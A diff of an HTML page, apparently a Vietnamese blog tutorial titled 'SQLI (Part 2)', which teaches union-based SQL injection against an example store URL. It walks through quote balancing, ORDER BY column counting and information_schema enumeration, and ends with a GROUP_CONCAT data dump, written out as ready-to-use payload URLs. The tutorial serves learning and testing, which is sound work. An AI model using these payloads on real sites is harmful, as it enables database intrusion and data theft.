@@ -1,213 +1,343 @@
-<!DOCTYPE HTML>
+<!DOCTYPE html>
 <html>
-    <head>
-		<!-- Google tag (gtag.js) -->
-		<script async src="https://www.googletagmanager.com/gtag/js?id=G-3NTSMWGK5D"></script>
-		<script>
-		  window.dataLayer = window.dataLayer || [];
-		  function gtag(){dataLayer.push(arguments);}
-		  gtag('js', new Date());
+  <head>
+    <!-- Google tag (gtag.js) -->
+    <script
+      async
+      src="https://www.googletagmanager.com/gtag/js?id=G-3NTSMWGK5D"
+    ></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag() {
+        dataLayer.push(arguments);
+      }
+      gtag("js", new Date());
 
-		  gtag('config', 'G-3NTSMWGK5D');
-		</script>
-        <meta charset="UTF-8">
-        <title>SQLI (Part 2)</title>
-        <link rel="icon" type="image/png" href="https://asayami.github.io/favicon.png"/>
-        <link rel="stylesheet" href="sqli_source/sqli_css.css">
-		<link rel="stylesheet" href="https://asayami.github.io/theme/theme.css">
-        <script src="sqli_source/sqli_js.js"></script>
-        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
-        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" integrity="sha512-Fo3rlrZj/k7ujTnHg4CGR2D7kSs0v4LLanw2qksYuRlEzO+tcaEPQogQ0KaoGN26/zrn20ImR1DfuLWnOo7aBA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
-        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
-        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
-        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
-        <meta name="description" content="Những bài viết, kinh nghiệm của mình về SQL Injection">
-		<meta name="keywords" content="Hacking, hack, SQLI, SQL Injection">
-		<meta name="author" content="Asayami Kurashin">
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-    </head>
-    <body>
-		<div class="snowflakes" aria-hidden="true">
-			<div class="snowflake">❅</div>
-			<div class="snowflake"><img src="https://asayami.github.io/theme/1.png" style="width:24px" class="img-fluid mx-auto d-block responsive_phone"></img></div>
-			<div class="snowflake">❆</div>
-			<div class="snowflake">❄</div>
-			<div class="snowflake"><img src="https://asayami.github.io/theme/2.png" style="width:24px" class="img-fluid mx-auto d-block responsive_phone"></img></div>
-			<div class="snowflake">❅</div>
-			<div class="snowflake">❆</div>
-			<div class="snowflake"><img src="https://asayami.github.io/theme/3.png" style="width:24px" class="img-fluid mx-auto d-block responsive_phone"></img></div>
-			<div class="snowflake">❄</div>
-		</div>
-        <!-- Navigation Bar -->
-        <nav class="navbar navbar-expand-md navbar-dark bg-dark fixed-top">
-            <div class="container-fluid navmain" id="navbar" onscroll="NavScroll()">
-                <script>window.onscroll = NavScroll;</script>
-                <a class="navbar-branch" href="https://asayami.github.io/">
-                    <img src="https://asayami.github.io/transparent-favicon.png" style="width:50px;" class="link"></img>
-                </a>
-                <button class="navbar-toggler ml-auto custom-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive"  aria-controls="navbarSupportedContent-7" aria-expanded="false" aria-label="Toggle navigation">
-                    <span class="navbar-toggler-icon"></span>
-                </button>
-                <div class="collapse navbar-collapse" id="navbarResponsive">
-                    <ul class="navbar-nav ml-auto">
-						<div class="dropdown-divider"></div>
-                        <li class="nav-item active navitem">
-                            <a href="https://asayami.github.io/">Home
-                                <span class="sr-only">(current)</span>
-                            </a>
-                        </li>
-                        <div class="dropdown-divider"></div>
-                        <li class="nav-item navitem">
-                            <a href="https://asayami.github.io/hacking.html">Security</a>
-                        </li>
-						<div class="dropdown-divider"></div>
-						<li class="nav-item navitem">
-                            <a href="https://asayami.github.io/embedded.html" class="link">Embedded</a>
-                        </li>
-                        <div class="dropdown-divider"></div>
-                        <li class="nav-item navitem">
-                            <a href="https://asayami.github.io#aboutanchor">About</a>
-                        </li>
-                        <div class="dropdown-divider"></div>
-                        <li class="nav-item navitem">
-                            <a href="https://asayami.github.io#contactanchor">Contact</a>
-                        </li>
-                    </ul>
-                </div>
-            </div>
-        </nav>
-        <div class="mainPicture"></div>
-        <div class="paratitle">
-            <h2>Main Structure</h2>
-        </div>
-        <div class="paragraph">
-            <p>Sau khi đã có kiến thức nền tảng cơ bản, chúng ta sẽ bắt đầu inject. Đầu tiên, điều chúng ta cần làm là thử
-            các input, injection khác nhau và xem web application phản hồi lại như thế nào, để thử xem có lỗi hay sự
-            khác thường nào xuất hiện hay không</p>
-            <p>Giả sử mình có một URL đang bị inject như sau:
-            <font color="#009933">
-            worldend.com/store.php?id=1') and 1=1--+
-            </font color="#009933">
-            và bên trong file PHP nếu không inject sẽ thực thi truy vấn
-            <font color="#009933">
-            select * from table_items where id=('1')
-            </font color="#009933">
-            và khi inject sẽ thực thi
-            <font color="#009933">
-            select * from table_items where id=('1') and 1=1--+')</p>
-            </font color="#009933">
-            <p>Mình chia phần đằng sau id=1 thành 3 phần nhỏ: balance, injection, comment</p>
-            <p>- Balance: không chứa ký tự nào, hoặc một hay nhiều ký tự. Balance được sử dụng để thoát ra khỏi chuỗi,
-            ngoặc,... nhằm tạo môi trường có thể thực thi query, injection. Các ký tự hay được sử dụng: ', ", '), "),...<br>
-            - Injection: chứa query chúng ta muốn thực thi. Như trong URL trên là and 1=1 mục đích là để xác định
-            balance, ngoài ra còn nhiều truy vấn thử balance khác như:
-            <font color="#009933">
-            <br>&emsp;or 1=1
-            <br>&emsp;and 1=1
-            <br>&emsp;and false
-            <br>&emsp;and true<br>
-            </font color="#009933">
-            - Comment: dùng để ngắt hoàn toàn phần phía sau đó trong toàn bộ query gửi đến database system, tránh gây lỗi.
-            Các comment thường dùng đã đề cập ở phần trước</p>
-        </div>
-        <div class="paratitle">
-            <h2>Get Data From Database (UNION & ORDER BY)</h2>
-        </div>
-        <div class="paragraph">
-			<p>Union được sử dụng để gộp các output. Ví dụ như query bên dưới:<br>
-			<font color="#009933">select name, age from table_beta where id=1 union select column_1, column_2 from table_alpha where id=2</font color="#009933"></p>
-			<img src="sqli_source/dbs_test.png" style="width:30%" class="img-fluid mx-auto d-block responsive_phone"></img>
-			<p>Kết quả trả về sẽ là:</p>
-			<img src="sqli_source/union_res.png" style="width:20%" class="img-fluid mx-auto d-block responsive_phone"></img>
-			<p>Tuy nhiên, UNION chỉ gộp những data có cùng số cột. Nếu thử query:
-			<font color="#009933">select name, age from table_beta where id=1 union select column_1 from table_alpha where id=2</font color="#009933">
-			thì chắc chắn sẽ có lỗi vì data đầu có 2 cột trong khi data sau chỉ gọi 1 cột. Bây giờ chúng ta
-			gặp phải một vấn đề khác, đó là số cột được gọi.</p>
-			<p>Để giải quyết vấn đề này chung ta sử dụng "order by". Ví dụ có query như sau:
-			<font color="#009933">select * from table_beta order by 3</font color="#009933">.
-			Kết quả trả về sẽ khác trước bởi vì lần này các hàng sẽ sắp xếp theo cột thứ 3 thay vì default</p>
-			<img src="sqli_source/order_by_res.png" style="width:20%" class="img-fluid mx-auto d-block responsive_phone"></img>
-			<p>ORDER BY sẽ sort các cột OUTPUT của query, như vậy để lấy số cột được gọi, chúng ta chỉ việc
-			thử các giá trị số sau order by cho đến khi gặp lỗi</p>
-			<p>Example:
-			<br><font color="#009933">&emsp;worldend.com/store.php?id=1') order by 1--+</font color="#009933">
-			(khi đó query tới dbs sẽ là
-			<font color="#009933">select * from table_items where id=('1') order by 1--+')</font color="#009933">
-			)
-			<br>&emsp;=> Vẫn xuất hiện output
-			<br>&emsp;... (thay 1 bằng 2,3,4,...)
-			<br><font color="#009933">&emsp;worldend.com/store.php?id=1') order by 5--+</font color="#009933">
-			<br>&emsp;=> Xuất hiện lỗi hoặc không hiển thị output => không có cột thứ 5 trong output này => Chỉ
-			có 4 cột trong kết quả trả về</p>
-			<p>Với một số web application, khi web pull data từ database lên web chỉ hiển thị hàng đầu tiên,
-			còn hàng union phía sau do ta inject thì lại nằm ở hàng 2 nên không hiển thị lên. Để tránh việc này
-			có thể inject như sau:
-			<br><font color="#009933">&emsp;worldend.com/store.php?id=1') and false union select 1,2,3,4--+</font color="#009933">
-			<br>&emsp;=> Hàng thứ 2 với 4 giá trị 1,2,3,4 sẽ bị đẩy lên hàng 1 do sự xuất hiện của and false</p>
-			<p>Bên cạnh đó, web pull 4 giá trị, nhưng chỉ hiển thị cột 2 chẳng hạn, chúng ta có thể test xem
-			cột nào được hiển thị như sau:
-			<br><font color="#009933">&emsp;worldend.com/store.php?id=1') and false union select data_1,data_2,data_3,data_4--+</font color="#009933">
-			<br>&emsp;=> Xem source code của trang và Ctrl + F keyword data_2 sẽ xuất hiện trong khi 3 từ khoá
-			còn lại không thể tìm thấy</p>
-		</div>
-        
-        <div class="paratitle">
-            <h2>Data Extraction using SQLi</h2>
-        </div>
-		
-		<div class="paragraph">
-			<p>Sau khi đã biết cách sử dụng UNION để lấy dữ liệu và ORDER BY để lấy số cột, chúng ta có thể khai thác
-			một số Default Variables/ Functions bên dưới bằng cách đưa tên của chúng vào UNION</p>
-			<img src="sqli_source/info_table.png" style="width:70%" class="img-fluid mx-auto d-block responsive_phone"></img>
-			<p><br>Example:
-			<font color="#009933">
-			&emsp;worldend.com/store.php?id=1') and false union select 1,version(),3,4--+
-			</font color="#009933"></p>
-			<p>Đầu tiên, chúng ta sẽ lấy danh sách toàn bộ database. Trong mỗi server, luôn luôn chứa một database
-			chứa nhiều thông tin chung, cốt lõi của cả server, đó là information_schema. Và danh sách cần tìm trong
-			database này đó là table schemata, cột schema_name. Do đó, URL sẽ là:</p>
-			<p><font color="#009933">&emsp;worldend.com/store.php?id=1') and false union select 1,schema_name,3,4 from information_schema.schemata--+</font color="#009933"></p>
-			<img src="sqli_source/schema_name.png" style="width:30%" class="img-fluid mx-auto d-block responsive_phone"></img>
-			<p><br>Tuy nhiên, nếu website chỉ hiển thị 1 dòng đầu tiên (hay information_schema trong ví dụ này), chúng
-			ta có thể sử dụng function LIMIT</p>
-			<p><font color="#009933">&emsp;worldend.com/store.php?id=1') and false union select 1,schema_name,3,4 from information_schema.schemata limit 0,1--+</font color="#009933">
-			</p><p>Khi đó, output sẽ lấy bắt đầu từ hàng 0, số lượng lấy là 1. Tương tự nếu muốn lấy output hàng thứ 3
-			thì thay bằng LIMIT 2,1</p>
-			<p>Sau khi đã có được tên của các database, chúng ta sẽ lấy tên các bảng có trong database. Tương tự như
-			danh sách database, danh sách tables được lưu ở database information_schema, bảng TABLES. Chúng ta sẽ
-			xuất data của cột table_name nhưng với value cột table_schema là tên database cần tìm</p>
-			<p><font color="#009933">&emsp;worldend.com/store.php?id=1') and false union select 1,table_name,3,4 from
-			information_schema.tables where table_schema='sukabase'--+</font color="#009933"></p>
-			<img src="sqli_source/table_list.png" style="width:15%" class="img-fluid mx-auto d-block responsive_phone"></img>
-			<p><br>Tiếp tục là xuất danh sách columns của bảng cần tìm, nằm trong cột column_name trong bảng
-			columns thuộc database information_schema</p>
-			<p><font color="#009933">&emsp;worldend.com/store.php?id=1') and false union select 1,column_name,3,4 from
-			information_schema.columns where table_schema='sukabase' and table_name='tablesuka'--+</font color="#009933"></p>
-			<p>Và kết quả thu được sẽ là id, name và age</p>
-			<p>Cuối cùng là xuất dữ liệu mong muốn từ các cột cần tìm. Ví dụ ta xuất cột id và age từ bảng
-			tablesuka trong database sukabase</p>
-			<p><font color="#009933">&emsp;worldend.com/store.php?id=1') and false union select 1,concat('id = ',id,',age = ',age),3,4 from
-			sukabase.tablesuka--+</font color="#009933"></p>
-			<p>Hàm concat được sử dụng để nối output của nhiều cột, hay giá trị bên ngoài với nhau</p>
-			<img src="sqli_source/extracted_data.png" style="width:15%" class="img-fluid mx-auto d-block responsive_phone"></img>
-			<p><br><i class="fa-solid fa-triangle-exclamation"></i>
-			Như đã nói ở trên, nếu output chỉ cho phép in 1 dòng đầu thì sử dụng function LIMIT. Tuy nhiên,
-			việc phải liên tục thay giá trị tham số của LIMIT khá cực, nên chúng ta có cách khác như dưới đây</p>
-			<p>Chúng ta sẽ sử dụng SQL query:</p>
-			<p>&emsp;<font color="#009933">
-			SELECT 1,CAST(GROUP_CONCAT(name,0x3a,age,'&#60;br>') AS CHAR(2048)),3,4 FROM (SELECT name,age FROM sukabase.tablesuka LIMIT 0,2000)a;
-			</font color="#009933"></p>
-			<p>Khác với bên trên chúng ta gọi data các cột từ bảng, lần này chúng ta gọi 2 cột name, age từ một bảng
-			tạm thời a chứa thông tin mong muốn như lệnh SELECT trong ngoặc đơn, sau đó GROUP_CONCAT sẽ nối các hàng
-			ở kết quả lại. Tuy nhiên, hàm GROUP_CONCAT chỉ có giới hạn 1024 chữ cái thôi, nên bên ngoài phải sử dụng
-			thêm hàm CAST để nâng buffer tới 2048 chẳng hạn (có thể tăng giá trị buffer cho tới limit của một
-			packet POST là 8192)</p>
-			<p>URL sẽ trở thành:</p>
-			<p>&emsp;<font color="#009933">
-			worldend.com/store.php?id=1') and false union SELECT 1,CAST(GROUP_CONCAT(name,0x3a,age,'&#60;br>') AS CHAR(2048)),3,4 FROM (SELECT name,age FROM sukabase.tablesuka LIMIT 0,2000)a--+
-			</font color="#009933"></p>
-			<p>Và đó là toàn bộ nội dung cơ bản của Union Based SQL Injection &#128526;</p>
-		</div>
-    </body>
-    
+      gtag("config", "G-3NTSMWGK5D");
+    </script>
+    <meta charset="UTF-8" />
+    <title>SQLI (Part 2)</title>
+    <link
+      rel="icon"
+      type="image/png"
+      href="https://asayami.github.io/favicon.png"
+    />
+    <link
+      rel="stylesheet"
+      href="https://asayami.github.io/theme/notebook.css"
+    />
+    <link rel="stylesheet" href="https://asayami.github.io/theme/theme.css" />
+    <script src="https://asayami.github.io/theme/notebook.js"></script>
+    <link
+      rel="stylesheet"
+      href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
+      integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
+      crossorigin="anonymous"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
+      integrity="sha512-Fo3rlrZj/k7ujTnHg4CGR2D7kSs0v4LLanw2qksYuRlEzO+tcaEPQogQ0KaoGN26/zrn20ImR1DfuLWnOo7aBA=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"
+      integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"
+      integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
+      crossorigin="anonymous"
+    ></script>
+    <meta
+      name="description"
+      content="Những bài viết, kinh nghiệm của mình về SQL Injection"
+    />
+    <meta name="keywords" content="Hacking, hack, SQLI, SQL Injection" />
+    <meta name="author" content="Asayami Kurashin" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+  </head>
+  <body>
+    <div id="themeSpace"></div>
+    <script>
+      loadNavbar();
+    </script>
+
+    <div
+      class="mainPicture"
+      style="
+        background-image: url('https://asayami.github.io/embedded_source/badusb_bg.png');
+      "
+    ></div>
+    <div class="paratitle">
+      <h2>Main Structure</h2>
+    </div>
+    <div class="paragraph">
+      <p>
+        Sau khi đã có kiến thức nền tảng cơ bản, chúng ta sẽ bắt đầu inject. Đầu
+        tiên, điều chúng ta cần làm là thử các input, injection khác nhau và xem
+        web application phản hồi lại như thế nào, để thử xem có lỗi hay sự khác
+        thường nào xuất hiện hay không
+      </p>
+      <p>
+        Giả sử mình có một URL đang bị inject như sau:
+        <a style="color: #009933"> worldend.com/store.php?id=1') and 1=1--+ </a>
+        và bên trong file PHP nếu không inject sẽ thực thi truy vấn
+        <a style="color: #009933"> select * from table_items where id=('1') </a>
+        và khi inject sẽ thực thi
+        <a style="color: #009933">
+          select * from table_items where id=('1') and 1=1--+')</a
+        >
+      </p>
+
+      <p>
+        Mình chia phần đằng sau id=1 thành 3 phần nhỏ: balance, injection,
+        comment
+      </p>
+      <p>
+        - Balance: không chứa ký tự nào, hoặc một hay nhiều ký tự. Balance được
+        sử dụng để thoát ra khỏi chuỗi, ngoặc,... nhằm tạo môi trường có thể
+        thực thi query, injection. Các ký tự hay được sử dụng: ', ", '),
+        "),...<br />
+        - Injection: chứa query chúng ta muốn thực thi. Như trong URL trên là
+        and 1=1 mục đích là để xác định balance, ngoài ra còn nhiều truy vấn thử
+        balance khác như:
+        <a style="color: #009933">
+          <br />&emsp;or 1=1 <br />&emsp;and 1=1 <br />&emsp;and false
+          <br />&emsp;and true<br />
+        </a>
+        - Comment: dùng để ngắt hoàn toàn phần phía sau đó trong toàn bộ query
+        gửi đến database system, tránh gây lỗi. Các comment thường dùng đã đề
+        cập ở phần trước
+      </p>
+    </div>
+    <div class="paratitle">
+      <h2>Get Data From Database (UNION & ORDER BY)</h2>
+    </div>
+    <div class="paragraph">
+      <p>
+        Union được sử dụng để gộp các output. Ví dụ như query bên dưới:<br />
+        <a style="color: #009933"
+          >select name, age from table_beta where id=1 union select column_1,
+          column_2 from table_alpha where id=2</a
+        >
+      </p>
+      <img
+        src="sqli_source/dbs_test.png"
+        style="width: 30%"
+        class="img-fluid mx-auto d-block responsive_phone"
+      />
+      <p>Kết quả trả về sẽ là:</p>
+      <img
+        src="sqli_source/union_res.png"
+        style="width: 20%"
+        class="img-fluid mx-auto d-block responsive_phone"
+      />
+      <p>
+        Tuy nhiên, UNION chỉ gộp những data có cùng số cột. Nếu thử query:
+        <a style="color: #009933"
+          >select name, age from table_beta where id=1 union select column_1
+          from table_alpha where id=2</a
+        >
+        thì chắc chắn sẽ có lỗi vì data đầu có 2 cột trong khi data sau chỉ gọi
+        1 cột. Bây giờ chúng ta gặp phải một vấn đề khác, đó là số cột được gọi.
+      </p>
+      <p>
+        Để giải quyết vấn đề này chung ta sử dụng "order by". Ví dụ có query như
+        sau: <a style="color: #009933">select * from table_beta order by 3</a>.
+        Kết quả trả về sẽ khác trước bởi vì lần này các hàng sẽ sắp xếp theo cột
+        thứ 3 thay vì default
+      </p>
+      <img
+        src="sqli_source/order_by_res.png"
+        style="width: 20%"
+        class="img-fluid mx-auto d-block responsive_phone"
+      />
+      <p>
+        ORDER BY sẽ sort các cột OUTPUT của query, như vậy để lấy số cột được
+        gọi, chúng ta chỉ việc thử các giá trị số sau order by cho đến khi gặp
+        lỗi
+      </p>
+      <p>
+        Example: <br /><a style="color: #009933"
+          >&emsp;worldend.com/store.php?id=1') order by 1--+</a
+        >
+        (khi đó query tới dbs sẽ là
+        <a style="color: #009933"
+          >select * from table_items where id=('1') order by 1--+')</a
+        >
+        )
+        <br />&emsp;=> Vẫn xuất hiện output <br />&emsp;... (thay 1 bằng
+        2,3,4,...) <br /><a style="color: #009933"
+          >&emsp;worldend.com/store.php?id=1') order by 5--+</a
+        >
+        <br />&emsp;=> Xuất hiện lỗi hoặc không hiển thị output => không có cột
+        thứ 5 trong output này => Chỉ có 4 cột trong kết quả trả về
+      </p>
+      <p>
+        Với một số web application, khi web pull data từ database lên web chỉ
+        hiển thị hàng đầu tiên, còn hàng union phía sau do ta inject thì lại nằm
+        ở hàng 2 nên không hiển thị lên. Để tránh việc này có thể inject như
+        sau: <br /><a style="color: #009933"
+          >&emsp;worldend.com/store.php?id=1') and false union select
+          1,2,3,4--+</a
+        >
+        <br />&emsp;=> Hàng thứ 2 với 4 giá trị 1,2,3,4 sẽ bị đẩy lên hàng 1 do
+        sự xuất hiện của and false
+      </p>
+      <p>
+        Bên cạnh đó, web pull 4 giá trị, nhưng chỉ hiển thị cột 2 chẳng hạn,
+        chúng ta có thể test xem cột nào được hiển thị như sau: <br /><a
+          style="color: #009933"
+          >&emsp;worldend.com/store.php?id=1') and false union select
+          data_1,data_2,data_3,data_4--+</a
+        >
+        <br />&emsp;=> Xem source code của trang và Ctrl + F keyword data_2 sẽ
+        xuất hiện trong khi 3 từ khoá còn lại không thể tìm thấy
+      </p>
+    </div>
+
+    <div class="paratitle">
+      <h2>Data Extraction using SQLi</h2>
+    </div>
+
+    <div class="paragraph">
+      <p>
+        Sau khi đã biết cách sử dụng UNION để lấy dữ liệu và ORDER BY để lấy số
+        cột, chúng ta có thể khai thác một số Default Variables/ Functions bên
+        dưới bằng cách đưa tên của chúng vào UNION
+      </p>
+      <img
+        src="sqli_source/info_table.png"
+        style="width: 70%"
+        class="img-fluid mx-auto d-block responsive_phone"
+      />
+      <p>
+        <br />Example:
+        <a style="color: #009933">
+          &emsp;worldend.com/store.php?id=1') and false union select
+          1,version(),3,4--+
+        </a>
+      </p>
+      <p>
+        Đầu tiên, chúng ta sẽ lấy danh sách toàn bộ database. Trong mỗi server,
+        luôn luôn chứa một database chứa nhiều thông tin chung, cốt lõi của cả
+        server, đó là information_schema. Và danh sách cần tìm trong database
+        này đó là table schemata, cột schema_name. Do đó, URL sẽ là:
+      </p>
+      <p>
+        <a style="color: #009933"
+          >&emsp;worldend.com/store.php?id=1') and false union select
+          1,schema_name,3,4 from information_schema.schemata--+</a
+        >
+      </p>
+      <img
+        src="sqli_source/schema_name.png"
+        style="width: 30%"
+        class="img-fluid mx-auto d-block responsive_phone"
+      />
+      <p>
+        <br />Tuy nhiên, nếu website chỉ hiển thị 1 dòng đầu tiên (hay
+        information_schema trong ví dụ này), chúng ta có thể sử dụng function
+        LIMIT
+      </p>
+      <p>
+        <a style="color: #009933"
+          >&emsp;worldend.com/store.php?id=1') and false union select
+          1,schema_name,3,4 from information_schema.schemata limit 0,1--+</a
+        >
+      </p>
+      <p>
+        Khi đó, output sẽ lấy bắt đầu từ hàng 0, số lượng lấy là 1. Tương tự nếu
+        muốn lấy output hàng thứ 3 thì thay bằng LIMIT 2,1
+      </p>
+      <p>
+        Sau khi đã có được tên của các database, chúng ta sẽ lấy tên các bảng có
+        trong database. Tương tự như danh sách database, danh sách tables được
+        lưu ở database information_schema, bảng TABLES. Chúng ta sẽ xuất data
+        của cột table_name nhưng với value cột table_schema là tên database cần
+        tìm
+      </p>
+      <p>
+        <a style="color: #009933"
+          >&emsp;worldend.com/store.php?id=1') and false union select
+          1,table_name,3,4 from information_schema.tables where
+          table_schema='sukabase'--+</a
+        >
+      </p>
+      <img
+        src="sqli_source/table_list.png"
+        style="width: 15%"
+        class="img-fluid mx-auto d-block responsive_phone"
+      />
+      <p>
+        <br />Tiếp tục là xuất danh sách columns của bảng cần tìm, nằm trong cột
+        column_name trong bảng columns thuộc database information_schema
+      </p>
+      <p>
+        <a style="color: #009933"
+          >&emsp;worldend.com/store.php?id=1') and false union select
+          1,column_name,3,4 from information_schema.columns where
+          table_schema='sukabase' and table_name='tablesuka'--+</a
+        >
+      </p>
+      <p>Và kết quả thu được sẽ là id, name và age</p>
+      <p>
+        Cuối cùng là xuất dữ liệu mong muốn từ các cột cần tìm. Ví dụ ta xuất
+        cột id và age từ bảng tablesuka trong database sukabase
+      </p>
+      <p>
+        <a style="color: #009933"
+          >&emsp;worldend.com/store.php?id=1') and false union select
+          1,concat('id = ',id,',age = ',age),3,4 from sukabase.tablesuka--+</a
+        >
+      </p>
+      <p>
+        Hàm concat được sử dụng để nối output của nhiều cột, hay giá trị bên
+        ngoài với nhau
+      </p>
+      <img
+        src="sqli_source/extracted_data.png"
+        style="width: 15%"
+        class="img-fluid mx-auto d-block responsive_phone"
+      />
+      <p>
+        <br /><i class="fa-solid fa-triangle-exclamation"></i> Như đã nói ở
+        trên, nếu output chỉ cho phép in 1 dòng đầu thì sử dụng function LIMIT.
+        Tuy nhiên, việc phải liên tục thay giá trị tham số của LIMIT khá cực,
+        nên chúng ta có cách khác như dưới đây
+      </p>
+      <p>Chúng ta sẽ sử dụng SQL query:</p>
+      <p>
+        &emsp;<a style="color: #009933">
+          SELECT 1,CAST(GROUP_CONCAT(name,0x3a,age,'&#60;br>') AS
+          CHAR(2048)),3,4 FROM (SELECT name,age FROM sukabase.tablesuka LIMIT
+          0,2000)a;
+        </a>
+      </p>
+      <p>
+        Khác với bên trên chúng ta gọi data các cột từ bảng, lần này chúng ta
+        gọi 2 cột name, age từ một bảng tạm thời a chứa thông tin mong muốn như
+        lệnh SELECT trong ngoặc đơn, sau đó GROUP_CONCAT sẽ nối các hàng ở kết
+        quả lại. Tuy nhiên, hàm GROUP_CONCAT chỉ có giới hạn 1024 chữ cái thôi,
+        nên bên ngoài phải sử dụng thêm hàm CAST để nâng buffer tới 2048 chẳng
+        hạn (có thể tăng giá trị buffer cho tới limit của một packet POST là
+        8192)
+      </p>
+      <p>URL sẽ trở thành:</p>
+      <p>
+        &emsp;<a style="color: #009933">
+          worldend.com/store.php?id=1') and false union SELECT
+          1,CAST(GROUP_CONCAT(name,0x3a,age,'&#60;br>') AS CHAR(2048)),3,4 FROM
+          (SELECT name,age FROM sukabase.tablesuka LIMIT 0,2000)a--+
+        </a>
+      </p>
+      <p>
+        Và đó là toàn bộ nội dung cơ bản của Union Based SQL Injection &#128526;
+      </p>
+    </div>
+  </body>
 </html>
